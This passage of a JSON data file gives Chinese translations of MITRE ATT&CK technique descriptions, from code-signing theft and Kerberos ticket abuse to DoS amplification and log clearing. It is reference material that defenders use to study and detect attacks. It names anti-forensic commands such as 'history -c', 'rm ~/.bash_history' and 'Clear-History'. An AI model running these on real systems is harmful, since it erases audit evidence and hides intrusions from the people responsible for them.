        "translated_description": "对手可能会购买和/或窃取代码签名证书，以在目标过程中使用。代码签名是对可执行文件和脚本进行数字签名的过程，以确认软件作者并保证代码未被更改或损坏。代码签名为开发者提供了一定程度的真实性，并保证程序未被篡改。(引用: Wikipedia Code Signing) 用户和/或安全工具可能会比不签名的代码更信任签名的代码，即使他们不知道谁颁发了证书或作者是谁。\n\n在[代码签名](https://attack.mitre.org/techniques/T1553/002)之前，对手可能会购买或窃取代码签名证书以用于操作。代码签名证书的购买可能通过前台组织进行，或使用从先前被破坏的实体窃取的信息，使对手能够以该实体的身份向证书提供商验证。对手还可能直接从被破坏的第三方窃取代码签名材料。"
    },
    "Windows File and Directory Permissions Modification": {
        "translated_name": "Windows 文件和目录权限修改",
        "translated_description": "对手可能会修改文件或目录权限/属性，以规避访问控制列表（ACL）并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户通过ACL进行管理。文件和目录ACL的实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。\n\nWindows 通过自主访问控制列表（DACL）实现文件和目录ACL。(引用: Microsoft DACL May 2018) 类似于标准ACL，DACL标识允许或拒绝访问可保护对象的帐户。当尝试访问可保护对象时，系统按顺序检查DACL中的访问控制条目。如果找到匹配的条目，则授予对对象的访问权限。否则，访问被拒绝。(引用: Microsoft Access Control Lists May 2018)\n\n对手可以使用内置的Windows命令与DACL进行交互，例如`icacls`、`cacls`、`takeown`和`attrib`，这些命令可以授予对特定文件和文件夹的更高权限。此外，[PowerShell](https://attack.mitre.org/techniques/T1059/001)提供了可以用来检索或修改文件和目录DACL的cmdlet。特定的文件和目录修改可能是许多技术的必要步骤，例如通过[辅助功能](https://attack.mitre.org/techniques/T1546/008)、[启动或登录初始化脚本](https://attack.mitre.org/techniques/T1037)建立持久性，或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制文件/配置文件。"
    },
    "Add-ins": {
        "translated_name": "加载项",
        "translated_description": "对手可能会滥用Microsoft Office加载项，以在被破坏的系统上获得持久性。Office加载项可用于向Office程序添加功能。(引用: Microsoft Office Add-ins) 不同的Office产品可以使用不同类型的加载项；包括Word/Excel加载项库（WLL/XLL）、VBA加载项、Office组件对象模型（COM）加载项、自动化加载项、VBA编辑器（VBE）、Visual Studio Tools for Office（VSTO）加载项和Outlook加载项。(引用: MRWLabs Office Persistence Add-ins)(引用: FireEye Mail CDS 2018)\n\n加载项可以用于获得持久性，因为它们可以设置为在Office应用程序启动时执行代码。"
    },
    "Transport Agent": {
        "translated_name": "传输代理",
        "translated_description": "对手可能会滥用Microsoft传输代理，以在系统上建立持久访问。Microsoft Exchange传输代理可以在通过传输管道的电子邮件消息上操作，以执行各种任务，例如过滤垃圾邮件、过滤恶意附件、记录或在所有外发电子邮件末尾添加公司签名。(引用: Microsoft TransportAgent Jun 2016)(引用: ESET LightNeuron May 2019) 传输代理可以由应用程序开发人员编写，然后编译为.NET程序集，随后在Exchange服务器上注册。传输代理将在电子邮件处理的指定阶段被调用，并执行开发人员定义的任务。\n\n对手可能会注册恶意传输代理，以在Exchange Server中提供持久性机制，该机制可以由对手指定的电子邮件事件触发。(引用: ESET LightNeuron May 2019) 尽管恶意传输代理可能会对通过Exchange传输管道的所有电子邮件进行调用，但代理可以配置为仅在响应对手定义的条件时执行特定任务。例如，传输代理可能仅在收件人电子邮件地址与对手提供的列表中的条目匹配时，执行诸如复制传输中的附件并保存以供稍后外传的操作。"
    },
    "System Information Discovery": {
        "translated_name": "系统信息发现",
        "translated_description": "对手可能会尝试获取有关操作系统和硬件的详细信息，包括版本、补丁、修补程序、服务包和架构。对手可能会在自动发现期间使用[系统信息发现](https://attack.mitre.org/techniques/T1082)中的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n工具如[Systeminfo](https://attack.mitre.org/software/S0096)可以用来收集详细的系统信息。如果以特权访问运行，可以通过macOS上的<code>systemsetup</code>配置工具收集系统数据的细分。例如，具有用户级访问权限的对手可以执行<code>df -aH</code>命令，以获取当前挂载的磁盘及其相关的可用空间。对手还可能利用网络设备上的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)来收集详细的系统信息（例如<code>show version</code>）。(引用: US-CERT-TA18-106A) [系统信息发现](https://attack.mitre.org/techniques/T1082)结合从其他形式的发现和侦察中收集的信息，可以推动有效负载开发和隐藏。(引用: OSX.FairyTale)(引用: 20 macOS Common Tools and Techniques)\n\n基础设施即服务（IaaS）云提供商如AWS、GCP和Azure允许通过API访问实例和虚拟机信息。成功的认证API调用可以返回数据，如特定实例的操作系统平台和状态或虚拟机的模型视图。(引用: Amazon Describe Instance)(引用: Google Instances Resource)(引用: Microsoft Virutal Machine API)"
    },
    "Application Layer Protocol": {
        "translated_name": "应用层协议",
        "translated_description": "对手可能会使用OSI应用层协议进行通信，以通过与现有流量混合来避免检测/网络过滤。发送到远程系统的命令以及这些命令的结果通常会嵌入在客户端和服务器之间的协议流量中。\n\n对手可能会利用许多不同的协议，包括用于网页浏览、文件传输、电子邮件、DNS或发布/订阅的协议。对于在封闭环境内发生的连接（例如代理或枢纽节点与其他节点之间的连接），常用的协议是SMB、SSH或RDP。(引用: Mandiant APT29 Eye Spy Email Nov 22)"
    },
    "AppDomainManager": {
        "translated_name": "AppDomainManager",
        "translated_description": "对手可能通过劫持 .NET `AppDomainManager` 加载程序集的方式来执行他们自己的恶意有效负载。 .NET 框架使用 `AppDomainManager` 类在进程内创建和管理一个或多个隔离的运行时环境（称为应用程序域）以托管 .NET 应用程序的执行。程序集（编译为运行 .NET 代码的 `.exe` 或 `.dll` 二进制文件）可以作为可执行代码加载到应用程序域中。(引用: Microsoft App Domains)\n\n称为“AppDomainManager 注入”，对手可能通过劫持 .NET 应用程序加载程序集的方式来执行任意代码。例如，恶意软件可能在目标进程内创建一个自定义应用程序域以加载和执行任意程序集。或者，可以篡改定义 .NET 运行时设置的配置文件（`.config`）或进程环境变量，以指示原本无害的 .NET 应用程序将恶意程序集（按名称标识）加载到目标进程中。(引用: PenTestLabs AppDomainManagerInject)(引用: PwC Yellow Liderc)(引用: Rapid7 AppDomain Manager Injection)"
    },
    "Remote Data Staging": {
        "translated_name": "远程数据暂存",
        "translated_description": "对手可能会在外传之前将从多个系统收集的数据暂存在一个系统的中央位置或目录中。数据可以保存在单独的文件中，也可以通过[归档收集的数据](https://attack.mitre.org/techniques/T1560)等技术合并到一个文件中。可能会使用交互式命令外壳，并且可以使用 [cmd](https://attack.mitre.org/software/S0106) 和 bash 中的常见功能将数据复制到暂存位置。\n\n在云环境中，对手可能会在特定实例或虚拟机中暂存数据，然后再进行外传。对手可能会[创建云实例](https://attack.mitre.org/techniques/T1578/002)并在该实例中暂存数据。(引用: Mandiant M-Trends 2020)\n\n通过在外传之前将数据暂存在一个系统上，对手可以减少与其 C2 服务器的连接次数，从而更好地规避检测。"
    },
    "Additional Container Cluster Roles": {
        "translated_name": "附加容器集群角色",
        "translated_description": "对手可能会向对手控制的用户或服务账户添加附加角色或权限，以保持对容器编排系统的持久访问。例如，具有足够权限的对手可能会创建 RoleBinding 或 ClusterRoleBinding，将角色或集群角色绑定到 Kubernetes 账户。(引用: Kubernetes RBAC)(引用: Aquasec Kubernetes Attack 2023) 在使用基于属性的访问控制 (ABAC) 的情况下，具有足够权限的对手可能会修改 Kubernetes ABAC 策略，以赋予目标账户额外的权限。(引用: Kuberentes ABAC)\n\n此账户修改可能紧随[创建账户](https://attack.mitre.org/techniques/T1136)或其他恶意账户活动之后。对手还可能修改他们已破坏的现有[有效账户](https://attack.mitre.org/techniques/T1078)。\n\n请注意，在云环境中部署的容器编排系统（如 Google Kubernetes Engine、Amazon Elastic Kubernetes Service 和 Azure Kubernetes Service）中，云角色基于访问控制 (RBAC) 分配或 ABAC 策略通常可以替代或补充本地权限分配。(引用: Google Cloud Kubernetes IAM)(引用: AWS EKS IAM Roles for Service Accounts)(引用: Microsoft Azure Kubernetes Service Service Accounts) 在这些情况下，此技术可能与[附加云角色](https://attack.mitre.org/techniques/T1098/003)结合使用。"
    },
    "Scheduled Task/Job": {
        "translated_name": "计划任务/作业",
        "translated_description": "对手可能会滥用任务调度功能来促进恶意代码的初始或定期执行。所有主要操作系统中都存在用于在指定日期和时间执行程序或脚本的实用程序。只要满足适当的身份验证要求（例如：Windows 环境中的 RPC 和文件及打印机共享），也可以在远程系统上调度任务。在远程系统上调度任务通常可能需要成为远程系统上管理员或其他特权组的成员。(引用: TechNet Task Scheduler Security)\n\n对手可能会使用任务调度在系统启动时或定期执行程序以实现持久性。这些机制也可以被滥用以在指定账户（例如具有提升权限/特权的账户）的上下文中运行进程。类似于[系统二进制代理执行](https://attack.mitre.org/techniques/T1218)，对手还滥用任务调度来潜在地掩盖受信任系统进程下的一次性执行。(引用: ProofPoint Serpent)"
    },
    "Msiexec": {
        "translated_name": "Msiexec",
        "translated_description": "对手可能会滥用 msiexec.exe 来代理执行恶意有效负载。Msiexec.exe 是 Windows Installer 的命令行实用程序，因此通常与执行安装包 (.msi) 相关联。(引用: Microsoft msiexec) Msiexec.exe 二进制文件也可能由 Microsoft 数字签名。\n\n对手可能会滥用 msiexec.exe 来启动本地或网络可访问的 MSI 文件。Msiexec.exe 还可以执行 DLL。(引用: LOLBAS Msiexec)(引用: TrendMicro Msiexec Feb 2018) 由于它可能被签名并且是 Windows 系统上的本地程序，msiexec.exe 可以用来绕过不考虑其潜在滥用的应用程序控制解决方案。如果启用了 <code>AlwaysInstallElevated</code> 策略，msiexec.exe 执行还可以提升到 SYSTEM 权限。(引用: Microsoft AlwaysInstallElevated 2018)"
    },
    "Network Trust Dependencies": {
        "translated_name": "网络信任依赖",
        "translated_description": "对手可能会收集有关受害者网络信任依赖的信息，以在目标过程中使用。有关网络信任的信息可能包括各种详细信息，包括具有连接（并可能提升）网络访问权限的第二方或第三方组织/域（例如：托管服务提供商、承包商等）。\n\n对手可能通过多种方式收集这些信息，例如通过[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接引诱。有关网络信任的信息也可能通过在线或其他可访问的数据集暴露给对手（例如：[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)）。(引用: Pentesting AD Forests) 收集这些信息可能会揭示其他形式的侦察机会（例如：[主动扫描](https://attack.mitre.org/techniques/T1595)或[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)），建立操作资源（例如：[获取基础设施](https://attack.mitre.org/techniques/T1583)或[妥协基础设施](https://attack.mitre.org/techniques/T1584)），和/或初始访问（例如：[受信任关系](https://attack.mitre.org/techniques/T1199)）。"
    },
    "Reflection Amplification": {
        "translated_name": "反射放大",
        "translated_description": "对手可能会尝试通过向目标反射大量网络流量来造成拒绝服务 (DoS)。这种类型的网络 DoS 利用托管并将响应发送到给定伪造源 IP 地址的第三方服务器中介。这个第三方服务器通常称为反射器。对手通过向反射器发送带有受害者伪造地址的数据包来完成反射攻击。类似于直接网络泛洪，可能会使用多个系统来进行攻击，或者可能会使用僵尸网络。同样，可能会使用一个或多个反射器将流量集中到目标上。(引用: Cloudflare ReflectionDoS May 2017) 这种网络 DoS 攻击还可能降低目标系统和网络的可用性和功能。\n\n反射攻击通常利用响应大于请求的协议来放大其流量，通常称为反射放大攻击。对手可能能够生成比发送到放大器的请求大几个数量级的攻击流量增加。此增加的程度将取决于许多变量，例如相关协议、使用的技术以及实际产生攻击流量放大的放大服务器。两个突出的协议是 DNS(引用: Cloudflare DNSamplficationDoS) 和 NTP(引用: Cloudflare NTPamplifciationDoS)，尽管已经记录了其他几种协议的使用。(引用: Arbor AnnualDoSreport Jan 2018) 特别是，memcache 协议显示出强大的协议，放大大小高达请求数据包的 51,200 倍。(引用: Cloudflare Memcrashed Feb 2018)"
    },
    "Password Filter DLL": {
        "translated_name": "密码过滤器 DLL",
        "translated_description": "对手可能会将恶意密码过滤器动态链接库 (DLL) 注册到身份验证过程中，以在验证用户凭据时获取这些凭据。\n\nWindows 密码过滤器是用于域和本地账户的密码策略实施机制。过滤器实现为包含方法的 DLL，用于根据密码策略验证潜在密码。过滤器 DLL 可以放置在本地计算机上用于本地账户和/或域控制器上用于域账户。在将新密码注册到安全账户管理器 (SAM) 之前，本地安全机构 (LSA) 会请求每个注册过滤器的验证。任何潜在的更改在每个注册过滤器确认验证之前都不会生效。\n\n对手可以注册恶意密码过滤器，从本地计算机和/或整个域中收集凭据。为了进行正确的验证，过滤器必须从 LSA 接收明文凭据。每次发出密码请求时，恶意密码过滤器都会接收这些明文凭据。(引用: Carnal Ownage Password Filters Sept 2013)"
    },
    "Terminal Services DLL": {
        "translated_name": "终端服务 DLL",
        "translated_description": "对手可能会滥用终端服务组件，以启用对系统的持久访问。Microsoft 终端服务，在某些 Windows Server 操作系统中自 2022 年起重命名为远程桌面服务，使远程终端连接到主机成为可能。终端服务允许服务器通过 RDP 向客户端传输完整的交互式图形用户界面。(引用: Microsoft Remote Desktop Services)\n\n作为“通用”进程（例如：<code>svchost.exe</code>）运行的[Windows 服务](https://attack.mitre.org/techniques/T1543/003)会加载服务的 DLL 文件，其位置存储在名为 <code>ServiceDll</code> 的注册表项中。(引用: Microsoft System Services Fundamentals) <code>termsrv.dll</code> 文件通常存储在 `%SystemRoot%\\System32\\` 中，是 `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\` 中终端服务的默认 <code>ServiceDll</code> 值。\n\n对手可能会修改和/或替换终端服务 DLL，以启用对受害主机的持久访问。(引用: James TermServ DLL) 对此 DLL 的修改可以执行任意有效负载（同时可能保留正常的 <code>termsrv.dll</code> 功能），也可以简单地启用终端服务的可滥用功能。例如，对手可能会通过修补 <code>termsrv.dll</code> 文件或修改 <code>ServiceDll</code> 值以指向提供增强 RDP 功能的 DLL 来启用并发[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)会话等功能。(引用: Windows OS Hub RDP)(引用: RDPWrap Github) 在非服务器 Windows 操作系统上，这种增强功能还可能使对手在创建新 RDP 会话时避免终端服务提示警告/注销用户。"
    },
    "AppleScript": {
        "translated_name": "AppleScript",
        "translated_description": "对手可能会滥用 AppleScript 进行执行。AppleScript 是一种 macOS 脚本语言，旨在通过称为 AppleEvents 的应用程序间消息控制应用程序和操作系统的部分。(引用: Apple AppleScript) 这些 AppleEvent 消息可以独立发送或通过 AppleScript 轻松编写脚本。这些事件可以定位打开的窗口、发送击键并与几乎任何本地或远程打开的应用程序交互。\n\n可以通过命令行运行脚本，使用 <code>osascript /path/to/script</code> 或 <code>osascript -e \"script here\"</code>。除了命令行，脚本还可以通过多种方式执行，包括邮件规则、Calendar.app 警报和 Automator 工作流程。通过在脚本文件开头添加 <code>#!/usr/bin/osascript</code>，AppleScripts 也可以作为纯文本 shell 脚本执行。(引用: SentinelOne AppleScript)\n\nAppleScripts 不需要调用 <code>osascript</code> 即可执行。但是，它们可以通过使用 macOS [本机 API](https://attack.mitre.org/techniques/T1106) <code>NSAppleScript</code> 或 <code>OSAScript</code> 从 mach-O 二进制文件中执行，这两者都独立于 <code>/usr/bin/osascript</code> 命令行实用程序执行代码。\n\n对手可能会滥用 AppleScript 执行各种行为，例如与打开的 SSH 连接交互、移动到远程计算机，甚至向用户显示虚假的对话框。这些事件无法远程启动应用程序（它们可以在本地启动），但如果它们已经在远程运行，则可以与应用程序交互。在 macOS 10.10 Yosemite 及更高版本上，AppleScript 能够执行 [本机 API](https://attack.mitre.org/techniques/T1106)，否则需要在 mach-O 二进制文件格式中编译和执行。(引用: SentinelOne macOS Red Team) 由于这是一种脚本语言，它也可以用于启动更常见的技术，例如通过 [Python](https://attack.mitre.org/techniques/T1059/006) 的反向 shell。(引用: Macro Malware Targets Macs)"
    },
    "Browser Extensions": {
        "translated_name": "浏览器扩展",
        "translated_description": "对手可能会滥用 Internet 浏览器扩展来建立对受害者系统的持久访问。浏览器扩展或插件是可以添加功能并自定义 Internet 浏览器各个方面的小程序。它们可以直接安装或通过浏览器的应用商店安装，通常具有浏览器可以访问的所有内容的访问权限和权限。(引用: Wikipedia Browser Extension)(引用: Chrome Extensions Definition)\n\n恶意扩展可以通过伪装成合法扩展的恶意应用商店下载、通过社会工程或已被对手破坏的系统安装到浏览器中。浏览器应用商店的安全性可能有限，因此恶意扩展可能很容易击败自动扫描程序。(引用: Malicious Chrome Extension Numbers) 根据浏览器的不同，对手还可能操纵扩展的更新 URL 以从对手控制的服务器安装更新，或操纵移动配置文件以静默安装其他扩展。\n\n在 macOS 11 之前，对手可以通过命令行使用 <code>profiles</code> 工具静默安装浏览器扩展，以安装恶意 <code>.mobileconfig</code> 文件。在 macOS 11+ 中，使用 <code>profiles</code> 工具不再能够安装配置文件，但可以种植和安装 <code>.mobileconfig</code> 文件，需用户交互。(引用: xorrior chrome extensions macOS)\n\n一旦安装了扩展，它可以在后台浏览网站，窃取用户在浏览器中输入的所有信息（包括凭据），并用作持久性的 RAT 安装程序。(引用: Chrome Extension Crypto Miner)(引用: ICEBRG Chrome Extensions)(引用: Banker Google Chrome Extension Steals Creds)(引用: Catch All Chrome Extension)\n\n也有使用恶意 Chrome 扩展通过 [命令和控制](https://attack.mitre.org/tactics/TA0011) 进行持久后门的僵尸网络实例。(引用: Stantinko Botnet)(引用: Chrome Extension C2 Malware) 对手还可能使用浏览器扩展修改浏览器权限和组件、隐私设置和其他安全控制以进行 [防御规避](https://attack.mitre.org/tactics/TA0005)。(引用: Browers FriarFox)(引用: Browser Adrozek)"
    },
    "Service Exhaustion Flood": {
        "translated_name": "服务耗尽洪水",
        "translated_description": "对手可能会针对系统提供的不同网络服务进行拒绝服务 (DoS) 攻击。对手通常会针对 DNS 和 Web 服务的可用性，但其他服务也可能成为目标。(引用: Arbor AnnualDoSreport Jan 2018) Web 服务器软件可以通过多种方式受到攻击，其中一些适用于一般情况，而另一些则特定于用于提供服务的软件。\n\n这种类型攻击的一个示例称为简单 HTTP 洪水，对手向 Web 服务器发送大量 HTTP 请求以压倒它和/或在其上运行的应用程序。此洪水依赖于原始流量来实现目标，耗尽受害软件提供服务所需的各种资源。(引用: Cloudflare HTTPflood)\n\n另一种变体称为 SSL 重新协商攻击，利用 SSL/TLS 中的协议功能。SSL/TLS 协议套件包括客户端和服务器同意用于后续安全连接的加密算法的机制。如果启用了 SSL 重新协商，则可以请求重新协商加密算法。在重新协商攻击中，对手建立 SSL/TLS 连接，然后继续发出一系列重新协商请求。由于加密重新协商在计算周期上具有显著成本，因此当大量进行时，这可能会影响服务的可用性。(引用: Arbor SSLDoS April 2012)"
    },
    "Compromise Hardware Supply Chain": {
        "translated_name": "妥协硬件供应链",
        "translated_description": "对手可能会在最终消费者收到产品之前操纵产品中的硬件组件，以实现数据或系统妥协。通过在供应链中修改硬件或固件，对手可以在消费者网络中插入后门，这可能难以检测，并使对手对系统具有高度控制。硬件后门可能插入到各种设备中，例如服务器、工作站、网络基础设施或外围设备。"
    },
    "Native API": {
        "translated_name": "本机 API",
        "translated_description": "对手可能会与本机操作系统应用程序编程接口 (API) 交互以执行行为。本机 API 提供了一种受控方式来调用内核中的低级操作系统服务，例如涉及硬件/设备、内存和进程的服务。(引用: NT API Windows)(引用: Linux Kernel API) 这些本机 API 在系统启动期间（当其他系统组件尚未初始化时）以及在例行操作期间执行任务和请求时由操作系统使用。\n\n对手可能会滥用这些操作系统 API 函数作为执行行为的一种手段。类似于 [命令和脚本解释器](https://attack.mitre.org/techniques/T1059)，本机 API 及其接口层次结构提供了与受害系统的各个组件交互和利用的机制。\n\n本机 API 函数（例如 <code>NtCreateProcess</code>）可以通过系统调用/系统调用直接调用，但这些功能通常也通过接口和库暴露给用户模式应用程序。(引用: OutFlank System Calls)(引用: CyberBit System Calls)(引用: MDSec System Calls) 例如，Windows API <code>CreateProcess()</code> 或 GNU <code>fork()</code> 等函数将允许程序和脚本启动其他进程。(引用: Microsoft CreateProcess)(引用: GNU Fork) 这可能允许 API 调用者执行二进制文件、运行 CLI 命令、加载模块等，因为存在数千个用于各种系统操作的类似 API 函数。(引用: Microsoft Win32)(引用: LIBC)(引用: GLIBC)\n\n更高级的软件框架，例如 Microsoft .NET 和 macOS Cocoa，也可用于与本机 API 交互。这些框架通常为 API 功能提供语言包装/抽象，并设计用于代码的易用性/可移植性。(引用: Microsoft NET)(引用: Apple Core Services)(引用: MACOS Cocoa)(引用: macOS Foundation)\n\n对手可能会使用汇编语言直接或间接调用系统调用，试图规避防御传感器和检测签名，例如用户模式 API 挂钩。(引用: Redops Syscalls) 对手还可能尝试篡改与 API 监控相关的传感器和防御工具，例如通过 [禁用或修改工具](https://attack.mitre.org/techniques/T1562/001) 取消挂钩监控的函数。"
    },
    "Ccache Files": {
        "translated_name": "Ccache 文件",
        "translated_description": "对手可能会尝试窃取存储在凭据缓存文件（或 ccache）中的 Kerberos 票证。这些文件用于短期存储用户的活动会话凭据。ccache 文件在用户身份验证时创建，允许访问多个服务而无需用户重新输入凭据。\n\n<code>/etc/krb5.conf</code> 配置文件和 <code>KRB5CCNAME</code> 环境变量用于设置 ccache 条目的存储位置。在 Linux 上，凭据通常存储在 `/tmp` 目录中，命名格式为 `krb5cc_%UID%` 或 `krb5.ccache`。在 macOS 上，ccache 条目默认存储在内存中，命名方案为 `API:{uuid}`。通常，用户使用 <code>kinit</code> 与票证存储交互，该命令为主体获取票证授予票证 (TGT)；<code>klist</code>，列出凭据缓存中当前持有的已获取票证；以及其他内置二进制文件。(引用: Kerberos GNU/Linux)(引用: Binary Defense Kerberos Linux)\n\n对手可以从存储在磁盘上的 ccache 文件中收集票证，并在不需要密码的情况下以当前用户身份进行身份验证以执行 [传递票证](https://attack.mitre.org/techniques/T1550/003) 攻击。对手还可以使用这些票证冒充具有提升权限的合法用户以执行 [权限提升](https://attack.mitre.org/tactics/TA0004)。对手可以使用 Kekeo 等工具将 ccache 文件转换为 Windows 格式以进行进一步的 [横向移动](https://attack.mitre.org/tactics/TA0008)。在 macOS 上，对手可能会使用开源工具或 Kerberos 框架通过低级 API 与 ccache 文件交互并提取 TGT 或服务票证。(引用: SpectorOps Bifrost Kerberos macOS 2019)(引用: Linux Kerberos Tickets)(引用: Brining MimiKatz to Unix)(引用: Kekeo)"
    },
    "Clear Network Connection History and Configurations": {
        "translated_name": "清除网络连接历史和配置",
        "translated_description": "对手可能会清除或删除恶意网络连接的证据，以清理其操作的痕迹。需要网络连接的行为（例如 [远程服务](https://attack.mitre.org/techniques/T1021) 或 [外部远程服务](https://attack.mitre.org/techniques/T1133)）可能会在系统和/或应用程序日志中创建配置设置以及突出连接历史的各种工件。防御者可以使用这些工件来监控或分析对手创建的网络连接。\n\n网络连接历史可能存储在各种位置。例如，RDP 连接历史可能存储在 Windows 注册表值中 (引用: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows 还可能在 <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> 和 `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\` 文件中存储有关最近 RDP 连接的信息。(引用: Moran RDPieces) 类似地，macOS 和 Linux 主机可能会在系统日志中存储突出连接历史的信息（例如存储在 `/Library/Logs` 和/或 `/var/log/` 中的日志）。(引用: Apple Culprit Access)(引用: FreeDesktop Journal)(引用: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\n恶意网络连接还可能需要更改第三方应用程序或网络配置设置，例如 [禁用或修改系统防火墙](https://attack.mitre.org/techniques/T1562/004) 或篡改以启用 [代理](https://attack.mitre.org/techniques/T1090)。对手可能会删除或修改这些数据以隐藏指标和/或阻碍防御分析。"
    },
    "AS-REP Roasting": {
        "translated_name": "AS-REP 烘焙",
        "translated_description": "对手可能会通过 [密码破解](https://attack.mitre.org/techniques/T1110/002) Kerberos 消息揭示已禁用 Kerberos 预身份验证的帐户的凭据。(引用: Harmj0y Roasting AS-REPs Jan 2017)\n\n预身份验证提供了针对离线 [密码破解](https://attack.mitre.org/techniques/T1110/002) 的保护。启用时，请求访问资源的用户通过发送带有时间戳的身份验证服务器请求 (AS-REQ) 消息来启动与域控制器 (DC) 的通信，该时间戳使用其密码的哈希值加密。仅当 DC 能够成功使用用户密码的哈希值解密时间戳时，它才会向用户发送包含票证授予票证 (TGT) 的身份验证服务器响应 (AS-REP) 消息。AS-REP 消息的一部分使用用户的密码签名。(引用: Microsoft Kerberos Preauth 2014)\n\n对于每个未启用预身份验证的帐户，对手可能会发送不带加密时间戳的 AS-REQ 消息，并接收包含 TGT 数据的 AS-REP 消息，该数据可能使用不安全的算法（例如 RC4）加密。恢复的加密数据可能容易受到离线 [密码破解](https://attack.mitre.org/techniques/T1110/002) 攻击，类似于 [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) 并暴露明文凭据。(引用: Harmj0y Roasting AS-REPs Jan 2017)(引用: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\n可以使用 Windows 工具（例如 [PowerShell](https://attack.mitre.org/techniques/T1059/001)）和 LDAP 过滤器滥用注册到域的帐户（无论是否具有特殊权限）列出所有已禁用预身份验证的域帐户。或者，对手可能会为每个用户发送 AS-REQ 消息。如果 DC 响应没有错误，则该帐户不需要预身份验证，并且 AS-REP 消息将已经包含加密数据。(引用: Harmj0y Roasting AS-REPs Jan 2017)(引用: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\n破解的哈希值可能会通过访问 [有效帐户](https://attack.mitre.org/techniques/T1078) 启用 [持久性](https://attack.mitre.org/tactics/TA0003)、[权限提升](https://attack.mitre.org/tactics/TA0004) 和 [横向移动](https://attack.mitre.org/tactics/TA0008)。(引用: SANS Attacking Kerberos Nov 2014)"
    },
    "Virtual Private Server": {
        "translated_name": "虚拟专用服务器",
        "translated_description": "对手可能会租用虚拟专用服务器（VPS），以在目标过程中使用。存在各种云服务提供商会将虚拟机/容器作为服务出售。通过使用VPS，对手可以使其操作难以物理追踪到他们。使用云基础设施还可以使对手更容易快速配置、修改和关闭其基础设施。\n\n获取VPS以用于对手生命周期的后期阶段（如命令和控制）可以使对手受益于与高信誉云服务提供商相关的普遍性和信任。对手还可能从以最少注册信息租赁VPS而闻名的VPS服务提供商处获取基础设施，从而更匿名地获取基础设施。(引用: TrendmicroHideoutsLease)"
    },
    "AutoHotKey & AutoIT": {
        "translated_name": "AutoHotKey 和 AutoIT",
        "translated_description": "对手可能会使用AutoIT和AutoHotKey自动化脚本执行命令和执行恶意任务。AutoIT和AutoHotkey（AHK）是脚本语言，使用户能够自动化Windows任务。这些自动化脚本可以用于执行各种操作，例如点击按钮、输入文本以及打开和关闭程序。(引用: AutoIT)(引用: AutoHotKey)\n\n对手可能会使用AHK（`.ahk`）和AutoIT（`.au3`）脚本在受害者系统上执行恶意代码。例如，对手已使用AHK执行有效负载和其他模块化恶意软件，如键盘记录器。对手还使用包含嵌入恶意软件的自定义AHK文件作为[网络钓鱼](https://attack.mitre.org/techniques/T1566)有效负载。(引用: Splunk DarkGate)\n\n这些脚本还可以编译成自包含的可执行有效负载（`.exe`）。(引用: AutoIT)(引用: AutoHotKey)"
    },
    "Reduce Key Space": {
        "translated_name": "减少密钥空间",
        "translated_description": "对手可能会通过减少加密通信的密码强度来减少解密网络上传输的数据所需的工作量。(引用: Cisco Synful Knock Evolution)\n\n对手可以通过减少用于将明文转换为密文的软件使用的密钥大小（例如，从数百或数千字节减少到仅几个字节）来削弱受感染网络设备上的加密软件。结果，对手显著减少了在没有密钥的情况下解密受保护信息所需的工作量。\n\n对手可能会使用通过[修改系统映像](https://attack.mitre.org/techniques/T1601)引入系统的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)中的专用命令修改使用的密钥大小和其他加密参数，以更改设备的配置。(引用: Cisco Blog Legacy Device Attacks)"
    },
    "Clear Command History": {
        "translated_name": "清除命令历史",
        "translated_description": "除了清除系统日志外，对手可能会清除被破坏账户的命令历史，以隐藏入侵期间执行的操作。各种命令解释器会跟踪用户在终端中输入的命令，以便用户可以回溯他们所做的操作。\n\n在Linux和macOS上，这些命令历史可以通过几种不同的方式访问。当用户登录时，这些命令历史会被记录在环境变量<code>HISTFILE</code>指向的文件中。当用户注销系统时，这些信息会被刷新到用户主目录中的一个名为<code>~/.bash_history</code>的文件中。这样做的好处是，它允许用户在不同的会话中回顾他们之前使用的命令。\n\n对手可能会通过手动清除历史记录（<code>history -c</code>）或删除bash历史文件<code>rm ~/.bash_history</code>来删除他们的命令。\n\n对手还可能利用网络设备上的[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)清除命令历史数据（<code>clear logging</code>和/或<code>clear history</code>）。(引用: US-CERT-TA18-106A)\n\n在Windows主机上，PowerShell有两种不同的命令历史提供者：内置历史和由<code>PSReadLine</code>模块管理的命令历史。内置历史仅跟踪当前会话中使用的命令。这些命令历史对其他会话不可用，并且在会话结束时会被删除。\n\n<code>PSReadLine</code>命令历史跟踪所有PowerShell会话中使用的命令，并将它们写入一个文件（默认情况下为<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）。此历史文件对所有会话可用，并包含所有过去的历史记录，因为该文件在会话结束时不会被删除。(引用: Microsoft PowerShell Command History)\n\n对手可能会运行PowerShell命令<code>Clear-History</code>以从当前PowerShell会话中清除整个命令历史。然而，这不会删除/清除<code>ConsoleHost_history.txt</code>文件。对手还可能删除<code>ConsoleHost_history.txt</code>文件或编辑其内容，以隐藏他们运行的PowerShell命令。(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)"
    },
    "Indirect Command Execution": {
